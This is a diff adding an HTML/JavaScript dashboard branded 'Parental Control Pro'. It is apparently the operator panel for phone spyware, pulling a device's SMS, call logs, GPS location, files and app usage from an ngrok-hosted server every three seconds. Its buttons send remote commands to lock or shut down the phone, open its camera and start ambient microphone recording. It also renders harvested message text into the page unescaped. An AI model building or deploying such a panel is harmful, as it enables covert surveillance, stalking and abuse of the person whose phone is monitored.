@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="">
+<head>
+<title>Parental Control Pro</title>
+
+<style>
+body{
+    margin:0;
+    font-family:Arial;
+    background:#0d1117;
+    color:#fff;
+}
+header{
+    background:#161b22;
+    padding:15px;
+    text-align:center;
+    color:cyan;
+    font-size:22px;
+}
+.container{
+    display:flex;
+}
+.sidebar{
+    width:280px;
+    background:#161b22;
+    padding:20px;
+    height:100vh;
+    overflow:auto;
+}
+.sidebar button{
+    width:100%;
+    margin:6px 0;
+    padding:10px;
+    background:#0ff;
+    border:none;
+    cursor:pointer;
+}
+.main{
+    flex:1;
+    padding:20px;
+}
+.card{
+    background:#161b22;
+    padding:15px;
+    margin-bottom:15px;
+    border-radius:10px;
+}
+.hidden{display:none;}
+</style>
+</head>
+
+<body>
+
+<header>📊 Parental Control System</header>
+
+<div class="container">
+
+<!-- SIDEBAR -->
+<div class="sidebar">
+
+<h3>📱 Monitoring</h3>
+<button onclick="show('activity')">Live Activity</button>
+<button onclick="show('location')">GPS Location</button>
+<button onclick="show('sms')">SMS Tracking</button>
+<button onclick="show('calls')">Call Logs</button>
+<button onclick="show('apps')">Apps Control</button>
+<button onclick="show('usage')">App Usage</button>
+<button onclick="show('browser')">Browser History</button>
+<button onclick="show('files')">File Manager</button>
+
+<h3>🎮 Control Panel</h3>
+<button onclick="cmd('lock')">Lock Device</button>
+<button onclick="cmd('shutdown')">Shutdown</button>
+<button onclick="cmd('wifi')">Toggle WiFi</button>
+<button onclick="cmd('bluetooth')">Bluetooth</button>
+
+<h3>📸 Live Access</h3>
+<button onclick="cmd('camera')">Open Camera</button>
+<button onclick="cmd('mic')">Ambient Recording</button>
+
+</div>
+
+<!-- MAIN -->
+<div class="main">
+
+<div id="activity" class="card">
+<h3>📊 Activity Logs</h3>
+
+<!-- 🔥 NEW DOWNLOAD BUTTON -->
+<button onclick="downloadLogs()">⬇️ Download Logs</button>
+
+<div id="logs"></div>
+</div>
+
+<div id="location" class="card hidden">
+<h3>📍 Location</h3>
+<div id="loc">No data</div>
+
+<h3>📍 Live Map</h3>
+<iframe id="mapFrame" width="100%" height="300"></iframe>
+</div>
+
+<div id="sms" class="card hidden">
+<h3>📩 SMS Data</h3>
+<div id="smsData">Loading...</div>
+</div>
+
+<div id="calls" class="card hidden">
+<h3>📞 Call Logs</h3>
+<div id="callData">Loading...</div>
+</div>
+
+<div id="apps" class="card hidden">
+<h3>📱 App Control</h3>
+<div>(Control via commands)</div>
+</div>
+
+<div id="usage" class="card hidden">
+<h3>📊 Usage</h3>
+<div id="usageData"></div>
+</div>
+
+<div id="browser" class="card hidden">
+<h3>🌐 Browser History</h3>
+<div>(Restricted)</div>
+</div>
+
+<div id="files" class="card hidden">
+<h3>📂 Files</h3>
+<div id="fileData">Loading...</div>
+</div>
+
+</div>
+</div>
+
+
+<script>
+
+// ================= GLOBAL ERROR HANDLER =================
+window.onerror = function(message, source, lineno, colno, error) {
+    console.error("GLOBAL ERROR:", message);
+    return true;
+};
+
+// ================= BASE URL =================
+const BASE_URL = "https://hanna-untransgressed-chieko.ngrok-free.dev";
+
+// ================= DOM =================
+const logs = document.getElementById("logs");
+const loc = document.getElementById("loc");
+const usageData = document.getElementById("usageData");
+const smsData = document.getElementById("smsData");
+const callData = document.getElementById("callData");
+const fileData = document.getElementById("fileData");
+
+let historyLogs = [];
+
+// ================= SECTION SWITCH =================
+function show(id){
+    document.querySelectorAll(".card").forEach(c=>c.classList.add("hidden"));
+    let el = document.getElementById(id);
+    if(el) el.classList.remove("hidden");
+}
+
+// ================= COMMAND =================
+async function cmd(c){
+    try{
+        let res = await fetch(BASE_URL + "/command",{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({command:c})
+        });
+
+        console.log("CMD RESPONSE:", await res.text());
+        alert("✅ Command Sent: " + c);
+
+    }catch(e){
+        console.error("CMD ERROR:", e);
+        alert("❌ Command Failed");
+    }
+}
+
+// ================= FETCH ALL =================
+async function fetchAll(){
+
+    console.log("🔄 Fetching data...");
+
+    // ========= LOGS =========
+    try{
+        let r = await fetch(BASE_URL + "/logs");
+        let logsData = await r.json();
+
+        console.log("LOGS:", logsData);
+
+        logs.innerHTML = "";
+        historyLogs = [];
+
+        if(Array.isArray(logsData) && logsData.length > 0){
+
+            logsData.forEach(l=>{
+
+                // 🔥 TIME FIX
+                let readableTime = l.time
+                    ? new Date(Number(l.time)).toLocaleString()
+                    : "-";
+
+                logs.innerHTML += `
+                <div style="padding:10px;border-bottom:1px solid #333">
+                    📱 <b>${l.app || "Unknown"}</b><br>
+                    🕒 ${readableTime}<br>
+                    ⏱ ${l.duration || "-"}
+                </div>`;
+
+                historyLogs.push(l);
+            });
+
+        }else{
+            logs.innerHTML = "⚠ No Logs Available";
+        }
+
+    }catch(e){
+        console.error("LOG ERROR:", e);
+        logs.innerHTML = "❌ Logs not loading";
+    }
+
+    // ========= DEVICE =========
+    try{
+        let d = await fetch(BASE_URL + "/device");
+        let dev = await d.json();
+
+        console.log("DEVICE:", dev);
+
+        // 📍 LOCATION
+        if(dev && dev.location){
+            let lat = dev.location.lat || 0;
+            let lon = dev.location.lon || dev.location.lng || 0;
+
+            loc.innerText = `📍 Lat: ${lat} | Lon: ${lon}`;
+
+            document.getElementById("mapFrame").src =
+                `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
+
+        }else{
+            loc.innerText = "⚠ No Location Data";
+        }
+
+        // 📊 USAGE
+        usageData.innerHTML = "";
+        if(Array.isArray(dev.usage) && dev.usage.length > 0){
+            dev.usage.forEach(u=>{
+                usageData.innerHTML += `<div>${u.app} - ${u.time}</div>`;
+            });
+        }else{
+            usageData.innerHTML = "No Usage Data";
+        }
+
+        // 📩 SMS
+        smsData.innerHTML = "";
+        if(Array.isArray(dev.sms) && dev.sms.length > 0){
+            dev.sms.forEach(s=>{
+                smsData.innerHTML += `<div>${s.number}: ${s.message}</div>`;
+            });
+        }else{
+            smsData.innerHTML = "No SMS";
+        }
+
+        // 📞 CALLS
+        callData.innerHTML = "";
+        if(Array.isArray(dev.calls) && dev.calls.length > 0){
+            dev.calls.forEach(c=>{
+                callData.innerHTML += `<div>${c.number} - ${c.type}</div>`;
+            });
+        }else{
+            callData.innerHTML = "No Calls";
+        }
+
+        // 📂 FILES
+        fileData.innerHTML = "";
+        if(Array.isArray(dev.files) && dev.files.length > 0){
+            dev.files.forEach(f=>{
+                fileData.innerHTML += `<div>${f.name}</div>`;
+            });
+        }else{
+            fileData.innerHTML = "No Files";
+        }
+
+    }catch(e){
+        console.error("DEVICE ERROR:", e);
+        loc.innerText = "❌ Device data not loading";
+    }
+}
+
+// ================= DOWNLOAD =================
+function downloadLogs(){
+    let text = "App\tTime\tDuration\n";
+
+    historyLogs.forEach(h=>{
+        text += `${h.app}\t${h.time}\t${h.duration}\n`;
+    });
+
+    let blob = new Blob([text], {type: "text/plain"});
+    let url = URL.createObjectURL(blob);
+
+    let a = document.createElement("a");
+    a.href = url;
+    a.download = "activity_logs.txt";
+    a.click();
+}
+
+// ================= AUTO REFRESH =================
+setInterval(fetchAll, 3000);
+fetchAll();
+
+// 🔥 FORCE SHOW ACTIVITY ON LOAD
+show("activity");
+
+</script>
+
+</body>
+</html>
